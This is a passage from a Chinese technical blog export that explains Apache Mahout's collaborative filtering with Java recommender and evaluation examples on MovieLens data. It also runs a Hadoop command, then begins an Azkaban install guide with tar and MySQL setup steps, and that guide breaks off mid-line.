alt="image-20211107162124666"></p><p><img "" class="lazyload placeholder" data-original="Mahout/image-20211107162200626.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107162200626"></p><h2 id="mahoutapi"><a class="markdownIt-Anchor" href="#mahoutapi">#</a> MahoutAPI</h2><p><strong>Mahout 学习（主要学习内容是 Mahout 中推荐部分的 ItemCF、UserCF、Hadoop 集群部署运行）</strong></p><p>1、Mahout 是什么？</p><ul><li><p>Mahout 是一个<strong>算法库</strong>，集成了很多算法。</p></li><li><p>Apache Mahout 是 Apache Software Foundation（ASF）旗下的一个开源项目，提供一些可扩展的<strong>机器学习领域经典算法的实现</strong>，旨在帮助开发人员更加方便快捷地创建智能应用程序。</p></li><li><p>Mahout 项目目前已经有了多个公共发行版本。Mahout 包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。</p></li><li><p>通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到 Hadoop 集群。</p></li><li><p>Mahout 的创始人 Grant Ingersoll 介绍了机器学习的基本概念，并演示了如何使用 Mahout 来实现文档集群、提出建议和组织内容。</p></li></ul><p>2、Mahout 是用来干嘛的？</p><p>2.1 推荐引擎</p><p>服务商或网站会根据你过去的行为为你推荐书籍、电影或文章。</p><p>2.2 聚类</p><p>Google news 使用聚类技术通过标题把新闻文章进行分组，从而按照逻辑线索来显示新闻，而并非给出所有新闻的原始列表。</p><p>2.3 分类</p><p>雅虎邮箱基于用户以前对正常邮件和垃圾邮件的报告，以及电子邮件自身的特征，来判别到来的消息是否是垃圾邮件。</p><p>3、Mahout 协同过滤算法</p><p>Mahout 使用了 Taste 来提高协同过滤算法的实现，它是一个基于 Java 实现的可扩展的，高效的推荐引擎。Taste 既实现了最基本的基于用户的和基于内容的推荐算法，同时也提供了扩展接口，使用户可以方便的定义和实现自己的推荐算法。同时，Taste 不仅仅只适用于 Java 应用程序，它可以作为内部服务器的一个组件以 HTTP 和 Web Service 的形式向外界提供推荐的逻辑。Taste 的设计使它能满足企业对推荐引擎在性能、灵活性和可扩展性等方面的要求。</p><p>Taste 主要包括以下几个接口：</p><ul><li>DataModel 是用户喜好信息的抽象接口，它的具体实现支持从任意类型的数据源抽取用户喜好信息。Taste 默认提供 JDBCDataModel 和 FileDataModel，分别支持从数据库和文件中读取用户的喜好信息。</li><li>UserSimilarity 和 ItemSimilarity 。UserSimilarity 用于定义两个用户间的相似度，它是基于协同过滤的推荐引擎的核心部分，可以用来计算用户的 “邻居”，这里我们将与当前用户口味相似的用户称为他的邻居。ItemSimilarity 类似的，计算 Item 之间的相似度。</li><li>UserNeighborhood 用于基于用户相似度的推荐方法中，推荐的内容是基于找到与当前用户喜好相似的邻居用户的方式产生的。UserNeighborhood 定义了确定邻居用户的方法，具体实现一般是基于 UserSimilarity 计算得到的。</li><li>Recommender 是推荐引擎的抽象接口，Taste 中的核心组件。程序中，为它提供一个 DataModel，它可以计算出对不同用户的推荐内容。实际应用中，主要使用它的实现类 GenericUserBasedRecommender 或者 GenericItemBasedRecommender，分别实现基于用户相似度的推荐引擎或者基于内容的推荐引擎。</li><li>RecommenderEvaluator ：评分器。</li><li>RecommenderIRStatsEvaluator ：搜集推荐性能相关的指标，包括准确率、召回率等等。</li></ul><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170623221329257-557838148.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>4、Mahout 协同过滤算法编程</p><p>1、创建 maven 项目</p><p>2、导入 mahout 依赖</p><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.mahout&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mahout&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.11.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.mahout&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mahout-examples&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.11.1&lt;/version&gt;</span><br><span class="line">        &lt;exclusions&gt;</span><br><span class="line">            &lt;exclusion&gt;</span><br><span class="line">                &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;</span><br><span class="line">            &lt;/exclusion&gt;</span><br><span class="line">        &lt;/exclusions&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><p>3、下载电影评分数据</p><p>下载地址：<a href="http://grouplens.org/datasets/movielens/">http://grouplens.org/datasets/movielens/</a></p><p>数据类别：7.2 万用户对 1 万部电影的百万级评价和 10 万个标签数据</p><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170623233121648-907850964.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170623233155726-1891613913.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>4、基于用户的推荐</p><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> 1 package com.ahu.learnmahout;</span><br><span class="line"> 2 </span><br><span class="line"> 3 import org.apache.mahout.cf.taste.impl.neighborhood.NearestNUserNeighborhood;</span><br><span class="line"> 4 import org.apache.mahout.cf.taste.impl.recommender.GenericUserBasedRecommender;</span><br><span class="line"> 5 import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;</span><br><span class="line"> 6 import org.apache.mahout.cf.taste.model.DataModel;</span><br><span class="line"> 7 import org.apache.mahout.cf.taste.neighborhood.UserNeighborhood;</span><br><span class="line"> 8 import org.apache.mahout.cf.taste.recommender.RecommendedItem;</span><br><span class="line"> 9 import org.apache.mahout.cf.taste.recommender.Recommender;</span><br><span class="line">10 import org.apache.mahout.cf.taste.similarity.UserSimilarity;</span><br><span class="line">11 import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;</span><br><span class="line">12 </span><br><span class="line">13 import java.io.File;</span><br><span class="line">14 import java.util.List;</span><br><span class="line">15 </span><br><span class="line">16 /**</span><br><span class="line">17  * Created by ahu_lichang on 2017/6/23.</span><br><span class="line">18  */</span><br><span class="line">19 public class BaseUserRecommender &#123;</span><br><span class="line">20     public static void main(String[] args) throws Exception &#123;</span><br><span class="line">21         //准备数据 这里是电影评分数据</span><br><span class="line">22         File file = new File(&quot;E:\\ml-10M100K\\ratings.dat&quot;);</span><br><span class="line">23         //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的</span><br><span class="line">24         DataModel dataModel = new GroupLensDataModel(file);</span><br><span class="line">25         //计算相似度，相似度算法有很多种，欧几里得、皮尔逊等等。</span><br><span class="line">26         UserSimilarity similarity = new PearsonCorrelationSimilarity(dataModel);</span><br><span class="line">27         //计算最近邻域，邻居有两种算法，基于固定数量的邻居和基于相似度的邻居，这里使用基于固定数量的邻居</span><br><span class="line">28         UserNeighborhood userNeighborhood = new NearestNUserNeighborhood(100, similarity, dataModel);</span><br><span class="line">29         //构建推荐器，协同过滤推荐有两种，分别是基于用户的和基于物品的，这里使用基于用户的协同过滤推荐</span><br><span class="line">30         Recommender recommender = new GenericUserBasedRecommender(dataModel, userNeighborhood, similarity);</span><br><span class="line">31         //给用户ID等于5的用户推荐10部电影</span><br><span class="line">32         List&lt;RecommendedItem&gt; recommendedItemList = recommender.recommend(5, 10);</span><br><span class="line">33         //打印推荐的结果</span><br><span class="line">34         System.out.println(&quot;使用基于用户的协同过滤算法&quot;);</span><br><span class="line">35         System.out.println(&quot;为用户5推荐10个商品&quot;);</span><br><span class="line">36         for (RecommendedItem recommendedItem : recommendedItemList) &#123;</span><br><span class="line">37             System.out.println(recommendedItem);</span><br><span class="line">38         &#125;</span><br><span class="line">39     &#125;</span><br><span class="line">40 &#125;</span><br></pre></td></tr></table></figure><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><p>运行结果：</p><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170623233313413-1189848861.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>5、基于物品的推荐</p><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package com.ahu.learnmahout;</span><br><span class="line"></span><br><span class="line">import org.apache.mahout.cf.taste.impl.recommender.GenericItemBasedRecommender;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;</span><br><span class="line">import org.apache.mahout.cf.taste.model.DataModel;</span><br><span class="line">import org.apache.mahout.cf.taste.recommender.RecommendedItem;</span><br><span class="line">import org.apache.mahout.cf.taste.similarity.ItemSimilarity;</span><br><span class="line">import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by ahu_lichang on 2017/6/24.</span><br><span class="line"> */</span><br><span class="line">public class BaseItemRecommender &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //准备数据 这里是电影评分数据</span><br><span class="line">        File file = new File(&quot;E:\\ml-10M100K\\ratings.dat&quot;);</span><br><span class="line">        //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的</span><br><span class="line">        DataModel dataModel = new GroupLensDataModel(file);</span><br><span class="line">        //计算相似度，相似度算法有很多种，欧几里得、皮尔逊等等。</span><br><span class="line">        ItemSimilarity itemSimilarity = new PearsonCorrelationSimilarity(dataModel);</span><br><span class="line">        //构建推荐器，协同过滤推荐有两种，分别是基于用户的和基于物品的，这里使用基于物品的协同过滤推荐</span><br><span class="line">        GenericItemBasedRecommender recommender = new GenericItemBasedRecommender(dataModel, itemSimilarity);</span><br><span class="line">        //给用户ID等于5的用户推荐10个与2398相似的商品</span><br><span class="line">        List&lt;RecommendedItem&gt; recommendedItemList = recommender.recommendedBecause(5, 2398, 10);</span><br><span class="line">        //打印推荐的结果</span><br><span class="line">        System.out.println(&quot;使用基于物品的协同过滤算法&quot;);</span><br><span class="line">        System.out.println(&quot;根据用户5当前浏览的商品2398，推荐10个相似的商品&quot;);</span><br><span class="line">        for (RecommendedItem recommendedItem : recommendedItemList) &#123;</span><br><span class="line">            System.out.println(recommendedItem);</span><br><span class="line">        &#125;</span><br><span class="line">        long start = System.currentTimeMillis();</span><br><span class="line">        recommendedItemList = recommender.recommendedBecause(5, 34, 10);</span><br><span class="line">        //打印推荐的结果</span><br><span class="line">        System.out.println(&quot;使用基于物品的协同过滤算法&quot;);</span><br><span class="line">        System.out.println(&quot;根据用户5当前浏览的商品34，推荐10个相似的商品&quot;);</span><br><span class="line">        for (RecommendedItem recommendedItem : recommendedItemList) &#123;</span><br><span class="line">            System.out.println(recommendedItem);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(System.currentTimeMillis() -start);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><p>运行结果：</p><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170624111836710-1685609646.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>6、评估推荐模型</p><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.ahu.learnmahout;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.apache.mahout.cf.taste.common.TasteException;</span><br><span class="line">import org.apache.mahout.cf.taste.eval.RecommenderBuilder;</span><br><span class="line">import org.apache.mahout.cf.taste.eval.RecommenderEvaluator;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.eval.AverageAbsoluteDifferenceRecommenderEvaluator;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.neighborhood.NearestNUserNeighborhood;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.recommender.GenericUserBasedRecommender;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;</span><br><span class="line">import org.apache.mahout.cf.taste.model.DataModel;</span><br><span class="line">import org.apache.mahout.cf.taste.neighborhood.UserNeighborhood;</span><br><span class="line">import org.apache.mahout.cf.taste.recommender.Recommender;</span><br><span class="line">import org.apache.mahout.cf.taste.similarity.UserSimilarity;</span><br><span class="line">import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by ahu_lichang on 2017/6/24.</span><br><span class="line"> */</span><br><span class="line">public class MyEvaluator &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //准备数据 这里是电影评分数据</span><br><span class="line">        File file = new File(&quot;E:\\ml-10M100K\\ratings.dat&quot;);</span><br><span class="line">        //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的</span><br><span class="line">        DataModel dataModel = new GroupLensDataModel(file);</span><br><span class="line">        //推荐评估，使用均方根</span><br><span class="line">        //RecommenderEvaluator evaluator = new RMSRecommenderEvaluator();</span><br><span class="line">        //推荐评估，使用平均差值</span><br><span class="line">        RecommenderEvaluator evaluator = new AverageAbsoluteDifferenceRecommenderEvaluator();</span><br><span class="line">        RecommenderBuilder builder = new RecommenderBuilder() &#123;</span><br><span class="line"></span><br><span class="line">            public Recommender buildRecommender(DataModel dataModel) throws TasteException &#123;</span><br><span class="line">                UserSimilarity similarity = new PearsonCorrelationSimilarity(dataModel);</span><br><span class="line">                UserNeighborhood neighborhood = new NearestNUserNeighborhood(2, similarity, dataModel);</span><br><span class="line">                return new GenericUserBasedRecommender(dataModel, neighborhood, similarity);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        // 用70%的数据用作训练，剩下的30%用来测试</span><br><span class="line">        double score = evaluator.evaluate(builder, null, dataModel, 0.7, 1.0);</span><br><span class="line">        //最后得出的评估值越小，说明推荐结果越好</span><br><span class="line">        System.out.println(score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><p>7、获取推荐的准确率和召回率</p><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package com.ahu.learnmahout;</span><br><span class="line"></span><br><span class="line">import org.apache.mahout.cf.taste.common.TasteException;</span><br><span class="line">import org.apache.mahout.cf.taste.eval.IRStatistics;</span><br><span class="line">import org.apache.mahout.cf.taste.eval.RecommenderBuilder;</span><br><span class="line">import org.apache.mahout.cf.taste.eval.RecommenderIRStatsEvaluator;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.eval.GenericRecommenderIRStatsEvaluator;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.neighborhood.NearestNUserNeighborhood;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.recommender.GenericUserBasedRecommender;</span><br><span class="line">import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;</span><br><span class="line">import org.apache.mahout.cf.taste.model.DataModel;</span><br><span class="line">import org.apache.mahout.cf.taste.neighborhood.UserNeighborhood;</span><br><span class="line">import org.apache.mahout.cf.taste.recommender.Recommender;</span><br><span class="line">import org.apache.mahout.cf.taste.similarity.UserSimilarity;</span><br><span class="line">import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by ahu_lichang on 2017/6/24.</span><br><span class="line"> */</span><br><span class="line">public class MyIRStatistics &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //准备数据 这里是电影评分数据</span><br><span class="line">        File file = new File(&quot;E:\\ml-10M100K\\ratings.dat&quot;);</span><br><span class="line">        //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的</span><br><span class="line">        DataModel dataModel = new GroupLensDataModel(file);</span><br><span class="line">        RecommenderIRStatsEvaluator statsEvaluator = new GenericRecommenderIRStatsEvaluator();</span><br><span class="line">        RecommenderBuilder recommenderBuilder = new RecommenderBuilder() &#123;</span><br><span class="line">            public Recommender buildRecommender(DataModel model) throws TasteException &#123;</span><br><span class="line">                UserSimilarity similarity = new PearsonCorrelationSimilarity(model);</span><br><span class="line">                UserNeighborhood neighborhood = new NearestNUserNeighborhood(4, similarity, model);</span><br><span class="line">                return new GenericUserBasedRecommender(model, neighborhood, similarity);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        // 计算推荐4个结果时的查准率和召回率</span><br><span class="line">        //使用评估器，并设定评估期的参数</span><br><span class="line">        //4表示&quot;precision and recall at 4&quot;即相当于推荐top4，然后在top-4的推荐上计算准确率和召回率</span><br><span class="line">        IRStatistics stats = statsEvaluator.evaluate(recommenderBuilder, null, dataModel, null, 4, GenericRecommenderIRStatsEvaluator.CHOOSE_THRESHOLD, 1.0);</span><br><span class="line">        System.out.println(stats.getPrecision());</span><br><span class="line">        System.out.println(stats.getRecall());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[<img "" class="lazyload placeholder" data-original="Mahout/copycode.gif" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="复制代码">](javascript:void (0)😉</p><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170624171117320-1871811297.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>5、Mahout 运行在 Hadoop 集群</p><p>**1、**<strong>Hadoop 执行脚本</strong></p><p>hadoop jar mahout-examples-0.9-job.jar org.apache.mahout.cf.taste.hadoop.item.RecommenderJob --input /sanbox/movie/10M.txt --output /sanbox/movie/r -s SIMILARITY_LOGLIKELIHOOD</p><p>参数说明</p><ul><li>–input (path) : 存储用户偏好数据的目录，该目录下可以包含一个或多个存储用户偏好数据的文本文件；</li><li>–output (path) : 结算结果的输出目录</li><li>–numRecommendations (integer) : 为每个用户推荐的 item 数量，默认为 10</li><li>–usersFile (path) : 指定一个包含了一个或多个存储 userID 的文件路径，仅为该路径下所有文件包含的 userID 做推荐计算 (该选项可选)</li><li>–itemsFile (path) : 指定一个包含了一个或多个存储 itemID 的文件路径，仅为该路径下所有文件包含的 itemID 做推荐计算 (该选项可选)</li><li>–filterFile (path) : 指定一个路径，该路径下的文件包含了 [userID,itemID] 值对，userID 和 itemID 用逗号分隔。计算结果将不会为 user 推荐 [userID,itemID] 值对中包含的 item (该选项可选)</li><li>–booleanData (boolean) : 如果输入数据不包含偏好数值，则将该参数设置为 true，默认为 false</li><li>–maxPrefsPerUser (integer) : 在最后计算推荐结果的阶段，针对每一个 user 使用的偏好数据的最大数量，默认为 10</li><li>–minPrefsPerUser (integer) : 在相似度计算中，忽略所有偏好数据量少于该值的用户，默认为 1</li><li>–maxSimilaritiesPerItem (integer) : 针对每个 item 的相似度最大值，默认为 100</li><li>–maxPrefsPerUserInItemSimilarity (integer) : 在 item 相似度计算阶段，针对每个用户考虑的偏好数据最大数量，默认为 1000</li><li>–similarityClassname (classname) : 向量相似度计算类</li><li>outputPathForSimilarityMatrix ：SimilarityMatrix 输出目录</li><li>–randomSeed ：随机种子 – sequencefileOutput ：序列文件输出路径</li><li>–tempDir (path) : 存储临时文件的目录，默认为当前用户的 home 目录下的 temp 目录</li><li>–threshold (double) : 忽略相似度低于该阀值的 item 对</li></ul><p>2、 <strong>执行结果</strong></p><p>上面命令运行完成之后，会在当前用户的 hdfs 主目录生成 temp 目录，该目录可由 --tempDir (path) 参数设置.</p><p><strong>后期学习补充：</strong></p><p><strong>Mahout 是基于 Hadoop 的机器学习和数据挖掘的一个分布式框架。Mahout 用 MapReduce 实现了部分数据挖掘算法，解决了并行挖掘的问题。</strong></p><p><strong>Mahout 应用场景：</strong></p><p><img "" class="lazyload placeholder" data-original="Mahout/1110462-20170819160931068-666710630.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Azkaban</title>
      <link href="/2021/11/05/Hive%E5%AD%A6%E4%B9%A0/Azkaban/"/>
      <url>/2021/11/05/Hive%E5%AD%A6%E4%B9%A0/Azkaban/</url>
      
        <content type="html"><![CDATA[<h1 id="azkaban任务调度"><a class="markdownIt-Anchor" href="#azkaban任务调度">#</a> Azkaban 任务调度</h1><h2 id="安装azkaban"><a class="markdownIt-Anchor" href="#安装azkaban">#</a> 安装 Azkaban</h2><p><strong>准备安装包</strong></p><p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211105174045501.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211105174045501"></p><p><strong>将安装包解压</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf azkaban-web-server-2.5.0.tar.gz</span><br><span class="line">tar -zxvf azkaban-sql-script-2.5.0.tar.gz </span><br><span class="line">tar -zxvf azkaban-executor-server-2.5.0.tar.gz</span><br><span class="line">mv azkaban-web-2.5.0/ /usr/local/azkaban-web</span><br><span class="line">mv azkaban-executor-2.5.0/ /usr/local/azkaban-executor</span><br></pre></td></tr></table></figure><p><strong>创建 mysql 用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p</span><br><span class="line"><span class="keyword">create</span> database azkaban;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> azkaban.<span class="operator">*</span> <span class="keyword">to</span> azkaban@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;azkaban&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> azkaban.<span class="operator">*</span> <span class="keyword">to</span> azkaban@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;azkaban&#x27;</span>;</span><br><span class="line">flush privileges;</span><br><span class="line">use azkaban</span><br><span class="line">source <span class="operator">/</span>root<span class="operator">/</span>azkaban<span 